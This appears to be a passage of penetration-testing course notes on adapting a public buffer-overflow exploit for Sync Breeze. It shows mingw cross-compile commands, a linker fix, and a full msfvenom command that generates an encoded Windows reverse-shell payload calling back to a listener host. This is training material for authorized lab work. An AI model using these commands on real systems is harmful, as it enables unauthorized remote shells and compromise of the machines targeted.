---Fixing Memory Corruption Exploits---
$ sudo apt install mingw-w64
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

Something went wrong during the compilation process and although the errors from Listing 8 may be unfamiliar, a simple Google search for the first error related to "WSAStartup" reveals that this is a function found in winsock.h. Further research indicates that these errors occur when the linker cannot find the winsock library, and that adding the -lws2_32 parameter to the i686-w64-mingw32-gcc command should fix the problem.
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

+++Fixing the Exploit
Since bad characters are already listed in the Python exploit, we can generate our own payload with msfvenom, remembering to target the x86 platform and format it for C code:
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
